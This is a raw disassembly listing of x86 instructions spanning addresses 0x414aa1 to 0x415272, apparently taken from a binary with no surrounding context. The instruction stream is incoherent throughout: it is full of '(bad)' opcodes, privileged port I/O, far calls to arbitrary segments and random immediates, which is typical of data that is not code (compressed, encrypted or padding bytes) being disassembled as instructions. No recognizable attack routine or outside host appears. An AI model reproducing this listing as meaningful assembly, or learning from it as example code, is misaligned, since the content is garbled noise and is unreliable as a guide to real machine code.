  414aa1:	jecxz  0x414a6c
  414aa3:	jl     0x414acf
  414aa5:	cmp    al,0xf8
  414aa7:	and    ecx,DWORD PTR [edx]
  414aa9:	scas   al,BYTE PTR es:[edi]
  414aaa:	jg     0x414b04
  414aac:	into   
  414aad:	popa   
  414aae:	xor    al,0x44
  414ab0:	mov    eax,ds:0x60976e3c
  414ab5:	loop   0x414a58
  414ab7:	xor    BYTE PTR fs:[ebx-0x1327c0bc],bh
  414abe:	dec    edi
  414abf:	sub    al,0x7c
  414ac1:	xchg   esi,eax
  414ac2:	ret    0x1113
  414ac5:	mov    ecx,0xcd8a2113
  414aca:	mov    edx,ds
  414acc:	jno    0x414a9d
  414ace:	mov    edi,0xf9f29360
  414ad3:	scas   eax,DWORD PTR es:[edi]
  414ad4:	fwait
  414ad5:	add    al,0x91
  414ad7:	add    ebx,DWORD PTR [ecx-0x32b5766e]
  414add:	and    ebp,DWORD PTR [ebx+0x3c]
  414ae0:	ss hlt 
  414ae2:	outs   dx,BYTE PTR ds:[esi]
  414ae3:	inc    edx
  414ae4:	mov    ebx,esp
  414ae6:	cli    
  414ae7:	cdq    
  414ae8:	add    BYTE PTR [eax],bl
  414aea:	cmp    esi,DWORD PTR [esi]
  414aec:	je     0x414b1c
  414aee:	cmp    BYTE PTR [ebx+edx*2],0x5b
  414af2:	mov    eax,fs
  414af4:	rcr    BYTE PTR [eax+0x529ceb8d],cl
  414afa:	sbb    eax,0xd57a5585
  414aff:	jg     0x414b05
  414b01:	(bad)  
  414b03:	fsubr  DWORD PTR [edx]
  414b05:	out    0x2e,eax
  414b07:	daa    
  414b08:	int3   
  414b09:	fstp   QWORD PTR [ebx-0x7c]
  414b0c:	cwde   
  414b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b0e:	lock dec ebp
  414b10:	inc    ebx
  414b11:	mov    esi,0x50a183f7
  414b16:	mov    ds,ebx
  414b18:	(bad)  
  414b1a:	ja     0x414ab3
  414b1c:	enter  0xc753,0x9d
  414b20:	sub    bh,BYTE PTR [ecx+0x5eba361a]
  414b26:	jbe    0x414b4c
  414b28:	xchg   ebx,eax
  414b29:	inc    edx
  414b2a:	and    edx,DWORD PTR [ebp-0x26de1181]
  414b30:	xchg   ecx,eax
  414b31:	neg    BYTE PTR [edi+0x49e0443d]
  414b37:	mov    esi,0x43dc343d
  414b3c:	xor    ch,BYTE PTR [esi-0x10777f32]
  414b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b43:	es loope 0x414ba9
  414b46:	inc    edi
  414b47:	sbb    al,0x1d
  414b49:	xor    DWORD PTR [edx],ecx
  414b4b:	fisubr WORD PTR [edx]
  414b4d:	int    0x6c
  414b4f:	mov    ds:0x716fac7e,al
  414b54:	retf   
  414b55:	pop    eax
  414b56:	test   al,0x91
  414b58:	xchg   ebx,eax
  414b59:	cs sub ebp,ebp
  414b5c:	jl     0x414ba3
  414b5e:	scas   al,BYTE PTR es:[edi]
  414b5f:	jne    0x414b3e
  414b61:	repz mov fs,WORD PTR [esi+0x5873d241]
  414b68:	dec    esp
  414b69:	loop   0x414be8
  414b6b:	nop
  414b6c:	out    dx,eax
  414b6d:	adc    dh,bl
  414b6f:	add    al,0xd7
  414b71:	in     al,dx
  414b72:	das    
  414b73:	sub    edx,ebx
  414b75:	inc    ebp
  414b76:	in     eax,dx
  414b77:	pop    ds
  414b78:	inc    edx
  414b79:	or     al,0xea
  414b7b:	jg     0x414b83
  414b7d:	outs   dx,BYTE PTR ds:[esi]
  414b7e:	cmp    ch,BYTE PTR [eax]
  414b80:	stc    
  414b81:	aaa    
  414b82:	not    DWORD PTR [ebp+0x24]
  414b85:	inc    ecx
  414b86:	mov    ebx,0xe214f227
  414b8b:	pop    esi
  414b8c:	mov    DWORD PTR [ebp+0x5cc55d2e],ebp
  414b92:	sbb    BYTE PTR [edi-0x749bb42b],dl
  414b98:	sbb    ch,BYTE PTR [eax+0x51d39aab]
  414b9e:	cdq    
  414b9f:	push   esp
  414ba0:	pop    ecx
  414ba1:	sar    DWORD PTR [edi+ebp*4-0x57],0x97
  414ba6:	(bad)  [edi]
  414ba8:	inc    ebx
  414ba9:	shr    edx,cl
  414bab:	fidiv  DWORD PTR [ebp-0x4d6a85ed]
  414bb1:	rcr    DWORD PTR [si],0xea
  414bb5:	dec    eax
  414bb6:	retf   
  414bb7:	pop    edx
  414bb8:	mov    ch,0x6c
  414bba:	or     BYTE PTR [esi],bl
  414bbc:	xchg   ebp,eax
  414bbd:	imul   ebx,DWORD PTR [esi+0x76],0x33
  414bc1:	fist   DWORD PTR [ecx+eiz*2]
  414bc4:	imul   edi,DWORD PTR [ecx],0xa0bfd441
  414bca:	mov    bl,0x70
  414bcc:	or     BYTE PTR [edi-0x7c],0x88
  414bd0:	or     eax,0xaea719b2
  414bd5:	es pop esi
  414bd7:	sete   BYTE PTR [ecx]
  414bda:	jp     0x414b8d
  414bdc:	repz jp 0x414b73
  414bdf:	adc    BYTE PTR [ebp+0x32],al
  414be2:	cs dec edi
  414be4:	pop    eax
  414be5:	mov    bh,0x50
  414be7:	stos   DWORD PTR es:[edi],eax
  414be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be9:	fbld   TBYTE PTR [edi+ebp*2]
  414bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bed:	jp     0x414c4c
  414bef:	bnd je 0x414c5c
  414bf2:	sbb    eax,0xd1666553
  414bf7:	xor    al,dh
  414bf9:	push   edx
  414bfa:	add    DWORD PTR [edx+0x51a65f87],esi
  414c00:	mov    bh,0x2b
  414c02:	fs or  al,0x90
  414c05:	jo     0x414c18
  414c07:	sbb    ch,dh
  414c09:	jmp    0x414c56
  414c0b:	and    BYTE PTR ds:0x23ceb930,bl
  414c11:	scas   al,BYTE PTR es:[edi]
  414c12:	gs sbb al,0x28
  414c15:	call   0x7a97d86c
  414c1a:	or     al,0x56
  414c1c:	mov    ds:0xa9944bde,eax
  414c21:	jnp    0x414c28
  414c23:	std    
  414c24:	popa   
  414c25:	(bad)  
  414c26:	imul   esp,DWORD PTR [edx+edx*1],0xc1eb207b
  414c2d:	fidivr DWORD PTR [esi]
  414c2f:	jns    0x414c93
  414c31:	inc    esp
  414c32:	mov    bl,0x11
  414c34:	shl    DWORD PTR [edx+0x570900bd],0x6c
  414c3b:	mov    bl,BYTE PTR [edx+eiz*1]
  414c3e:	xchg   bh,cl
  414c40:	pop    ebx
  414c41:	fwait
  414c42:	dec    eax
  414c43:	les    esp,FWORD PTR [edi-0x79d23ad4]
  414c49:	sbb    al,0xe7
  414c4b:	jo     0x414bf3
  414c4d:	stos   DWORD PTR es:[di],eax
  414c4f:	dec    ecx
  414c50:	jnp    0x414c32
  414c52:	inc    ecx
  414c53:	jne    0x414be3
  414c55:	pop    edx
  414c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c57:	in     eax,dx
  414c58:	test   BYTE PTR [edi-0x67b10a12],al
  414c5e:	push   ds
  414c5f:	pop    eax
  414c60:	push   edx
  414c61:	sbb    edi,0x57
  414c64:	stos   BYTE PTR es:[edi],al
  414c65:	ds pop ebp
  414c67:	loopne 0x414c8f
  414c69:	jno    0x414c74
  414c6b:	xor    cl,dl
  414c6d:	mov    bl,0x82
  414c6f:	imul   edx,DWORD PTR ds:0xf92049a7,0x9293ac1a
  414c79:	imul   ebx,DWORD PTR [edx*8+0x69e7c84d],0x9a53322f
  414c84:	mov    ah,0xf3
  414c86:	mov    edi,0x90ec6915
  414c8b:	sub    ah,BYTE PTR [edx+ebx*1]
  414c8e:	mov    BYTE PTR [edx+0x60],al
  414c91:	sub    bl,BYTE PTR [edi-0x68828134]
  414c97:	pop    es
  414c98:	gs pop es
  414c9a:	(bad)  
  414c9c:	jmp    0x414c47
  414c9e:	push   ebx
  414c9f:	jo     0x414c6b
  414ca1:	dec    esp
  414ca2:	aas    
  414ca3:	ja     0x414cfd
  414ca5:	jmp    0x414c73
  414ca7:	xor    eax,0x97f2a28
  414cac:	mov    ds:0xa0d31c0d,al
  414cb1:	(bad)  
  414cb3:	pop    edx
  414cb4:	outs   dx,DWORD PTR ds:[esi]
  414cb5:	inc    edi
  414cb6:	cmp    al,BYTE PTR [ebx-0x29a52136]
  414cbc:	jb     0x414cd5
  414cbe:	mov    ?,WORD PTR [ebx-0x419bea63]
  414cc4:	sbb    ebp,DWORD PTR [ebx+0x2c]
  414cc7:	dec    esi
  414cc8:	loopne 0x414c6c
  414cca:	mov    ah,0x6c
  414ccc:	imul   edx,DWORD PTR [edx-0x1d97f2d1],0x48
  414cd3:	push   edi
  414cd4:	aas    
  414cd5:	jmp    0x640c:0xecbd7dba
  414cdc:	xchg   ebx,eax
  414cdd:	mov    esp,0x691a2555
  414ce2:	(bad)  
  414ce3:	xchg   edi,eax
  414ce4:	ret    
  414ce5:	aas    
  414ce6:	aas    
  414ce7:	inc    ecx
  414ce8:	mov    ds:0x29af37e4,eax
  414ced:	scas   al,BYTE PTR es:[edi]
  414cee:	outs   dx,DWORD PTR ds:[esi]
  414cef:	arpl   WORD PTR [ecx-0x75b63784],ax
  414cf5:	add    al,0x26
  414cf7:	mov    ch,0x68
  414cf9:	push   edi
  414cfa:	jg     0x414cec
  414cfc:	sbb    eax,0x2fecaf8d
  414d01:	mov    gs,edx
  414d03:	lock inc edx
  414d05:	dec    ebp
  414d06:	int    0x4a
  414d08:	imul   edi,esi,0x5ba9a7af
  414d0e:	pop    eax
  414d0f:	fdiv   st(3),st
  414d11:	mov    ds:0x21186add,eax
  414d16:	cmc    
  414d17:	and    eax,0xa65f40c6
  414d1c:	inc    ebx
  414d1d:	retf   
  414d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d1f:	xchg   esp,eax
  414d20:	dec    ecx
  414d21:	xor    dh,al
  414d23:	push   edi
  414d24:	int    0xc5
  414d26:	imul   ecx,DWORD PTR [eax-0x1e],0x72
  414d2a:	in     eax,0x99
  414d2c:	cmp    edx,ecx
  414d2e:	test   DWORD PTR ss:[edx-0x448dd671],ecx
  414d35:	fwait
  414d36:	add    al,BYTE PTR [eax]
  414d38:	xchg   esi,eax
  414d39:	and    eax,0xb3af46ad
  414d3e:	out    0x27,eax
  414d40:	addr16 jb 0x414d92
  414d43:	xchg   ebp,ecx
  414d45:	xor    eax,0x697a3b8d
  414d4a:	rcl    ecx,cl
  414d4c:	or     BYTE PTR [esi-0x1d76db52],dl
  414d52:	leave  
  414d53:	je     0x414d5e
  414d55:	mov    BYTE PTR [edi-0x11],dl
  414d58:	xchg   ebx,eax
  414d59:	les    edx,FWORD PTR [ebx-0xdf74997]
  414d5f:	icebp  
  414d60:	sbb    DWORD PTR [edi],0x66
  414d63:	xchg   esi,eax
  414d64:	fisttp DWORD PTR [ebx-0x52470cef]
  414d6a:	shl    esi,cl
  414d6c:	and    BYTE PTR [edx+0x51],cl
  414d6f:	jae    0x414d91
  414d71:	int    0x38
  414d73:	pop    eax
  414d74:	cmp    DWORD PTR [edx+eiz*8],edi
  414d77:	mov    ecx,0x45994456
  414d7c:	call   0x6190d9e2
  414d81:	aas    
  414d82:	and    eax,esp
  414d84:	xchg   ebx,eax
  414d85:	pop    edi
  414d86:	shl    DWORD PTR [edi-0xada8e50],1
  414d8c:	shr    esp,1
  414d8e:	sub    ecx,ebp
  414d90:	adc    al,dl
  414d92:	out    0x55,eax
  414d94:	prefetch BYTE PTR [edx+0x453716d9]
  414d9b:	or     eax,edi
  414d9d:	imul   ecx,esi,0xffffff91
  414da0:	mov    dh,0x7a
  414da2:	dec    DWORD PTR [edi]
  414da4:	int    0xe5
  414da6:	sbb    al,0xaf
  414da8:	sub    eax,0x7d432c6b
  414dad:	shl    BYTE PTR [ecx+0x51],0xa2
  414db1:	cmc    
  414db2:	fidivr DWORD PTR [eax-0x7e]
  414db5:	std    
  414db6:	mov    al,ds:0xf0d281bd
  414dbb:	mov    esp,0x7957f9b3
  414dc0:	(bad)  
  414dc1:	push   0x24
  414dc3:	pop    ds
  414dc4:	ret    0x23dc
  414dc7:	cmp    eax,0xe47eeeb8
  414dcc:	inc    ebp
  414dcd:	mov    esi,ebp
  414dcf:	mov    eax,0x30c4de85
  414dd4:	dec    esp
  414dd5:	fcmovnu st,st(4)
  414dd7:	adc    eax,0x4cbbd153
  414ddc:	xchg   ch,cl
  414dde:	adc    DWORD PTR [ebx+0x395d0c1c],edi
  414de4:	enter  0xaf99,0xad
  414de8:	mov    dh,0xfe
  414dea:	or     BYTE PTR [edx+0x63],dl
  414ded:	and    al,0xcf
  414def:	das    
  414df0:	shl    bh,cl
  414df2:	or     DWORD PTR [esi-0x49],edi
  414df5:	fldcw  WORD PTR [ebx+0x7a]
  414df8:	pusha  
  414df9:	mov    ebp,0xc85606ce
  414dfe:	jbe    0x414d80
  414e00:	sbb    al,0xed
  414e03:	clc    
  414e04:	mov    bh,0x17
  414e06:	div    BYTE PTR [edx-0x710668c2]
  414e0c:	popf   
  414e0d:	mov    fs,WORD PTR [ebx+0x3e]
  414e10:	movlps QWORD PTR [edx+0x3f90ba45],xmm4
  414e17:	pusha  
  414e18:	nop
  414e19:	add    al,0xe2
  414e1b:	pop    edx
  414e1c:	inc    esi
  414e1d:	popa   
  414e1e:	mov    esi,0xefc92c68
  414e23:	int    0x8f
  414e25:	pop    ecx
  414e26:	push   ecx
  414e27:	adc    esp,esp
  414e29:	pop    ecx
  414e2a:	sbb    esp,DWORD PTR [esi+0x5a]
  414e2d:	js     0x414dc3
  414e2f:	adc    ecx,0xb2f94e37
  414e35:	xchg   ebp,eax
  414e36:	(bad)  
  414e37:	adc    al,0x19
  414e39:	add    al,0xf1
  414e3b:	or     eax,0x718482ed
  414e40:	pop    esi
  414e41:	fs push 0x12
  414e44:	(bad)  
  414e45:	outs   dx,DWORD PTR ds:[esi]
  414e46:	loope  0x414e0e
  414e48:	in     eax,dx
  414e49:	jge    0x414e5b
  414e4b:	into   
  414e4c:	(bad)
  414e4f:	(bad)  
  414e50:	(bad)  
  414e51:	in     eax,dx
  414e52:	inc    edi
  414e53:	loop   0x414e24
  414e55:	mov    ah,0x4f
  414e57:	mov    esi,ecx
  414e59:	mov    DWORD PTR [ebx-0x32],edi
  414e5c:	xor    eax,0x2354c4e0
  414e61:	retf   0xd5ed
  414e64:	sbb    al,0xa7
  414e66:	pushf  
  414e67:	push   ds
  414e68:	repz rcr ah,cl
  414e6b:	pop    eax
  414e6c:	or     dh,dh
  414e6e:	repnz add esi,DWORD PTR [ebx]
  414e71:	cmp    DWORD PTR [ebx+ecx*4+0x6669aa5b],eax
  414e78:	xor    BYTE PTR [edi],bl
  414e7a:	rcr    al,1
  414e7c:	fnstenv [edx+0x3f]
  414e7f:	jecxz  0x414e36
  414e81:	mov    bl,0x19
  414e83:	outs   dx,DWORD PTR ds:[esi]
  414e84:	sub    BYTE PTR [esi+0x71],bh
  414e87:	jmp    0x414ef6
  414e89:	jle    0x414e2e
  414e8b:	xchg   ebp,eax
  414e8c:	das    
  414e8d:	in     al,dx
  414e8e:	mov    ebx,0xefaf8be4
  414e93:	sti    
  414e94:	sub    ebp,ecx
  414e96:	fistp  DWORD PTR [ecx+0x19]
  414e99:	add    edi,esp
  414e9b:	jo     0x414e42
  414e9d:	xor    ecx,0x7f
  414ea0:	es cmp esp,eax
  414ea3:	or     edx,DWORD PTR [eax+0x33]
  414ea6:	test   eax,0x2dbc3750
  414eab:	sbb    ch,cl
  414ead:	adc    al,0xa7
  414eaf:	xchg   dh,dl
  414eb1:	loop   0x414ebe
  414eb3:	inc    BYTE PTR [edx+ebx*1+0x20e933e3]
  414eba:	pop    ecx
  414ebb:	jno    0x414e84
  414ebd:	cs push edi
  414ebf:	stos   DWORD PTR es:[edi],eax
  414ec0:	js     0x414f34
  414ec2:	mov    al,0x74
  414ec4:	push   ebp
  414ec5:	dec    edi
  414ec6:	sbb    al,0x2c
  414ec8:	mov    cl,BYTE PTR [ecx+0x29234a6b]
  414ece:	lock jns 0x414f22
  414ed1:	outs   dx,BYTE PTR ds:[esi]
  414ed2:	std    
  414ed3:	cmp    BYTE PTR [esi+0x5a0e766a],cl
  414ed9:	retf   0x9138
  414edc:	out    dx,al
  414edd:	out    dx,al
  414ede:	call   0xb7d1d5a8
  414ee3:	(bad)  
  414ee4:	leave  
  414ee5:	cmp    al,0x26
  414ee7:	nop
  414ee8:	mov    ah,0xe5
  414eea:	pushf  
  414eeb:	mov    bl,0xcf
  414eed:	out    0xa5,eax
  414eef:	retf   0xccec
  414ef2:	rol    BYTE PTR [esi+0x70c354fd],cl
  414ef8:	lahf   
  414ef9:	mov    cl,0xba
  414efb:	(bad)  
  414efc:	add    al,0xea
  414efe:	mov    BYTE PTR [ebx+0x47],dl
  414f01:	repnz push ebx
  414f03:	mov    ecx,0xaa9bb87a
  414f08:	or     esp,DWORD PTR [eax+0x127d014c]
  414f0e:	call   0xbdac:0x3e761f8
  414f15:	pop    esp
  414f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f17:	xchg   esi,eax
  414f18:	push   0x3f1a628e
  414f1d:	jno    0x414f8c
  414f1f:	pop    esp
  414f20:	jle    0x414ef8
  414f22:	icebp  
  414f23:	lods   eax,DWORD PTR ds:[esi]
  414f24:	push   esp
  414f25:	addr16 call 0x2bee:0x47f56a13
  414f2d:	push   ds
  414f2e:	push   0x27117d86
  414f33:	lock sbb al,0x64
  414f36:	mov    esp,0x320b5915
  414f3b:	sub    eax,0xbdd8c898
  414f40:	loopne 0x414f87
  414f42:	mov    esi,0xbf66e114
  414f47:	pop    edx
  414f48:	aad    0x6a
  414f4a:	and    dh,dl
  414f4c:	mov    dh,0xe1
  414f4e:	xor    ah,BYTE PTR [edx-0x252fd3a4]
  414f54:	test   BYTE PTR [edx-0x77],bl
  414f57:	sub    cl,BYTE PTR [edi-0x5a]
  414f5a:	icebp  
  414f5b:	(bad)  
  414f5c:	adc    eax,0xfa8d70ac
  414f61:	repz adc DWORD PTR [esi-0x58],esi
  414f65:	aas    
  414f66:	addr16 (bad) 
  414f68:	cdq    
  414f69:	sub    eax,0xb938df69
  414f6e:	inc    esp
  414f6f:	adc    al,0xa0
  414f71:	sub    eax,0x25d273f1
  414f76:	inc    esi
  414f77:	fcmovnbe st,st(6)
  414f79:	xchg   esp,eax
  414f7a:	ror    edi,0x80
  414f7d:	das    
  414f7e:	jmp    0x667cb036
  414f83:	jo     0x414f70
  414f85:	push   esp
  414f86:	xchg   edi,eax
  414f87:	popa   
  414f88:	or     eax,0xae36efe0
  414f8d:	retf   0x1500
  414f90:	lock mov al,0x81
  414f93:	mov    ds:0xffe57ec6,al
  414f98:	inc    eax
  414f99:	mov    esp,0x6fd26a90
  414f9e:	inc    edx
  414f9f:	push   esp
  414fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fa1:	(bad)  
  414fa2:	pop    edi
  414fa3:	sub    BYTE PTR [esi],dh
  414fa5:	add    DWORD PTR [edi-0x4834ebd3],ebx
  414fab:	les    ebp,FWORD PTR [ecx]
  414fad:	jecxz  0x414fd4
  414faf:	mov    WORD PTR [eax+0x3c],es
  414fb2:	mov    WORD PTR [esi-0x49],gs
  414fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fb6:	dec    ecx
  414fb7:	sbb    DWORD PTR [ebp-0x780515b9],ebp
  414fbd:	add    eax,DWORD PTR [edx-0x43ebeb71]
  414fc3:	mov    edi,DWORD PTR [ecx]
  414fc5:	mov    al,ds:0xd02519f
  414fca:	pop    esi
  414fcb:	xor    BYTE PTR [esi+0x19],cl
  414fce:	(bad)  
  414fcf:	(bad)  
  414fd0:	sbb    al,BYTE PTR [esi+0xb01403b]
  414fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fd7:	dec    ebp
  414fd8:	pop    ebx
  414fd9:	je     0x415040
  414fdb:	sub    DWORD PTR [eax+0x25],ecx
  414fde:	cmp    esp,DWORD PTR [ebx-0x4a]
  414fe1:	fdiv   QWORD PTR [ebx]
  414fe3:	les    esp,FWORD PTR [ecx+0x14]
  414fe6:	or     bl,BYTE PTR [ebx+0x59b0e2fb]
  414fec:	push   ds
  414fed:	shl    BYTE PTR [ebx],1
  414fef:	rol    DWORD PTR [edx],1
  414ff1:	xchg   edx,eax
  414ff2:	xchg   ebp,eax
  414ff3:	xor    dh,BYTE PTR [edi+0xe9a59be]
  414ff9:	or     eax,0xdad398c8
  414ffe:	cmp    al,0x27
  415000:	pop    esp
  415001:	shl    BYTE PTR ds:0x1304dab2,cl
  415007:	js     0x415037
  415009:	cmp    ecx,ebp
  41500b:	fdivr  QWORD PTR [esp+ecx*8]
  41500e:	arpl   WORD PTR es:[edi],cx
  415011:	mov    ch,0xc8
  415013:	test   BYTE PTR ds:0x5817ac1,bh
  415019:	xlat   BYTE PTR ds:[ebx]
  41501a:	test   al,0x15
  41501c:	mov    BYTE PTR [edi+0x3f],al
  41501f:	push   ds
  415020:	mov    cl,0x61
  415022:	inc    esi
  415023:	mov    edx,0x5a5ba348
  415028:	nop
  415029:	pop    ecx
  41502a:	add    eax,0x379084ed
  41502f:	jnp    0x414fb3
  415031:	aaa    
  415032:	sbb    ecx,edi
  415034:	dec    ebx
  415035:	add    al,0xe8
  415037:	shl    bl,0xb2
  41503a:	pushf  
  41503b:	fadd   st(1),st
  41503d:	(bad)  
  41503e:	mul    BYTE PTR [edx-0x2c3f7f78]
  415044:	scas   al,BYTE PTR es:[edi]
  415045:	and    eax,0x32ff9dea
  41504a:	out    0xd,al
  41504c:	and    ebp,DWORD PTR [ebx-0x1c]
  41504f:	popf   
  415050:	jmp    0x8fbe511d
  415055:	push   eax
  415056:	pop    eax
  415057:	dec    ebp
  415058:	mov    cl,0x3a
  41505a:	xchg   ebx,eax
  41505b:	sbb    cl,cl
  41505d:	faddp  st(2),st
  41505f:	mov    dl,0x6d
  415061:	test   eax,0x98ed4f1d
  415066:	shl    BYTE PTR [ecx],1
  415068:	cmp    bh,BYTE PTR [ebx-0x5f]
  41506b:	icebp  
  41506c:	jle    0x415000
  41506e:	and    BYTE PTR [ecx-0x63],dl
  415071:	add    BYTE PTR [eax+0x18b61250],dh
  415077:	in     al,0x23
  415079:	mov    bh,0xd6
  41507b:	jne    0x4150b6
  41507d:	shl    ebp,1
  41507f:	fisttp QWORD PTR [esi+0x31]
  415082:	imul   eax,ecx,0x2d9239f8
  415088:	and    ah,BYTE PTR ds:0x17f855ea
  41508e:	xor    ebx,edi
  415090:	push   edi
  415091:	and    DWORD PTR [ecx-0x76],ebp
  415094:	jecxz  0x41510b
  415096:	loopne 0x415027
  415098:	aad    0x5
  41509a:	shl    DWORD PTR ds:[edi+0x3b840022],cl
  4150a1:	dec    esi
  4150a2:	mov    WORD PTR [edx],ds
  4150a4:	shr    DWORD PTR [ebx-0xd],1
  4150a7:	mov    dl,0x94
  4150a9:	or     eax,0xb2c0db20
  4150ae:	lods   eax,DWORD PTR ds:[esi]
  4150af:	dec    edx
  4150b0:	push   ebx
  4150b1:	mov    edi,0xa31b0d31
  4150b6:	shr    esp,1
  4150b8:	adc    al,0x94
  4150ba:	stc    
  4150bb:	pushf  
  4150bc:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4150be:	pushf  
  4150bf:	inc    DWORD PTR [edx-0x3b]
  4150c2:	add    al,0x6e
  4150c4:	and    eax,0xa93699a
  4150c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ca:	cdq    
  4150cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150cc:	inc    ebp
  4150cd:	jl     0x4150b0
  4150cf:	cmp    ebp,DWORD PTR [eax]
  4150d1:	int3   
  4150d2:	lock xor DWORD PTR [ebp+0x78],eax
  4150d6:	mov    al,ds:0x1663bcba
  4150db:	push   es
  4150dc:	out    dx,eax
  4150dd:	cmp    ebx,DWORD PTR [esi+0xd]
  4150e0:	cmp    DWORD PTR [edx-0x79],ebx
  4150e3:	adc    esp,esi
  4150e5:	lock and al,0xe9
  4150e8:	dec    ebp
  4150e9:	enter  0xf29b,0x8
  4150ed:	cmp    BYTE PTR [ecx],dh
  4150ef:	(bad)  
  4150f1:	jbe    0x415093
  4150f3:	pop    es
  4150f4:	test   al,0x60
  4150f6:	or     edi,edi
  4150f8:	mov    esi,DWORD PTR [ecx]
  4150fa:	jo     0x4150e1
  4150fc:	add    esp,ecx
  4150fe:	rol    BYTE PTR [edi],cl
  415100:	mov    ds:0xbdd85e9f,eax
  415105:	dec    eax
  415106:	pop    ss
  415107:	cld    
  415108:	add    al,0x54
  41510a:	test   esi,0x3b629a36
  415110:	mov    edi,0xb11fd533
  415115:	fcmovu st,st(6)
  415117:	pop    edi
  415118:	mov    WORD PTR [edi-0x3332af10],cs
  41511e:	xor    eax,0x2e3a40ae
  415123:	es (bad) 
  415125:	(bad)  
  415126:	xchg   ecx,eax
  415127:	jle    0x415142
  415129:	pop    ds
  41512a:	adc    dl,BYTE PTR [esi+0x72]
  41512d:	dec    ecx
  41512e:	aas    
  41512f:	adc    DWORD PTR [edx+eiz*1+0x59],ecx
  415133:	inc    eax
  415134:	sbb    ah,BYTE PTR [eax-0x290af34d]
  41513a:	inc    esi
  41513b:	inc    BYTE PTR [ecx-0x1d]
  41513e:	jo     0x41512a
  415140:	cmp    dh,BYTE PTR [esi+ebx*8]
  415143:	xor    edi,DWORD PTR [esi-0x5]
  415146:	es test bl,al
  415149:	xor    BYTE PTR [ecx-0x14],cl
  41514c:	call   0x92f:0xea456b90
  415153:	jg     0x415187
  415155:	mov    edi,0xca75e9d2
  41515a:	(bad)  
  41515b:	jp     0x41515f
  41515d:	push   edi
  41515e:	push   esp
  41515f:	sub    eax,0xc6e3cc64
  415164:	lods   al,BYTE PTR ds:[esi]
  415165:	stos   DWORD PTR es:[edi],eax
  415166:	out    dx,eax
  415167:	stos   DWORD PTR es:[edi],eax
  415168:	enter  0x440c,0x7a
  41516c:	or     al,0xc3
  41516e:	loopne 0x4151dd
  415170:	popf   
  415171:	dec    ebx
  415172:	xchg   edi,eax
  415173:	das    
  415174:	xlat   BYTE PTR ds:[ebx]
  415175:	ret    
  415176:	cmp    edi,DWORD PTR [esi-0x4a265fe2]
  41517c:	adc    esp,ecx
  41517e:	(bad)  
  41517f:	shl    BYTE PTR [esp+edi*4],cl
  415182:	lock repnz (bad) 
  415185:	sub    esp,DWORD PTR [eax+0x1d]
  415188:	mov    al,ds:0xde325032
  41518d:	retf   
  41518e:	test   DWORD PTR [eax],0x4e47d6c6
  415194:	scas   eax,DWORD PTR es:[edi]
  415195:	jl     0x415131
  415197:	and    DWORD PTR [eax+0x4f67851c],ecx
  41519d:	(bad)  
  41519e:	loop   0x4151aa
  4151a0:	jns    0x41521a
  4151a2:	mov    ebp,0x75849514
  4151a7:	sub    ah,BYTE PTR [esi-0x3972bb57]
  4151ad:	aad    0x0
  4151af:	xchg   ebp,edi
  4151b1:	arpl   ax,sp
  4151b3:	push   esp
  4151b4:	cwde   
  4151b5:	jbe    0x4151ea
  4151b7:	xchg   esi,edi
  4151b9:	ja     0x41519b
  4151bb:	rcr    DWORD PTR [ecx+0x7c3f8942],1
  4151c1:	lock test esp,ecx
  4151c4:	or     edi,esi
  4151c6:	out    dx,al
  4151c7:	mov    ds:0x813acb06,al
  4151cc:	les    ecx,FWORD PTR [edx-0x1b96b3a0]
  4151d2:	in     eax,0x70
  4151d4:	mov    edi,0x79840c3f
  4151d9:	into   
  4151da:	cmp    ebx,DWORD PTR [edx+0x7a]
  4151dd:	or     BYTE PTR [edx+0x2e],al
  4151e0:	jnp    0x4151fd
  4151e2:	sti    
  4151e3:	loope  0x415263
  4151e5:	aas    
  4151e6:	and    edi,DWORD PTR [ebx-0x751748cf]
  4151ec:	cmp    eax,0xe529a7f2
  4151f1:	xchg   DWORD PTR [edi+0x46deb800],esp
  4151f7:	push   esi
  4151f8:	sub    DWORD PTR [edx+0x6e91b10f],0x288fac63
  415202:	cs or  eax,0x11d00c58
  415208:	dec    edx
  415209:	cdq    
  41520a:	call   0x99c7:0xe9baca83
  415211:	mov    esi,0x64a6525b
  415216:	icebp  
  415217:	scas   al,BYTE PTR es:[edi]
  415218:	dec    esi
  415219:	stos   BYTE PTR es:[edi],al
  41521a:	lahf   
  41521b:	sbb    al,0xe3
  41521d:	mov    bl,0xff
  41521f:	add    BYTE PTR [ecx+0x22418bd2],cl
  415225:	dec    esp
  415226:	nop
  415227:	(bad)  [edi+0x51d153f0]
  41522d:	xchg   edi,eax
  41522e:	mov    bh,0xde
  415230:	(bad)  
  415231:	rcl    BYTE PTR [edx],1
  415233:	idiv   BYTE PTR [edi+0x7a]
  415236:	call   0xc3e750eb
  41523b:	xchg   ecx,eax
  41523c:	outs   dx,BYTE PTR ds:[esi]
  41523d:	in     eax,dx
  41523e:	(bad)  
  41523f:	cmc    
  415240:	cmp    BYTE PTR [eax+0x7b],al
  415243:	jb     0x415282
  415245:	or     al,0x64
  415247:	ffreep st(5)
  415249:	xchg   ebp,eax
  41524a:	mov    BYTE PTR gs:[eax-0x7b7b765e],ch
  415251:	arpl   sp,cx
  415253:	mov    ebp,ebp
  415255:	and    al,0x89
  415257:	inc    eax
  415258:	xor    DWORD PTR [eax],edi
  41525a:	fiadd  WORD PTR [ebx-0x27]
  41525d:	mov    DWORD PTR [eax],esp
  41525f:	xlat   BYTE PTR ds:[ebx]
  415260:	mov    al,ds:0x7caf687
  415265:	or     bl,BYTE PTR [esi+ebx*2+0x6d504eeb]
  41526c:	imul   edx,esi,0xfffffff2
  41526f:	pop    edx
  415270:	es push cs
  415272:	iret   
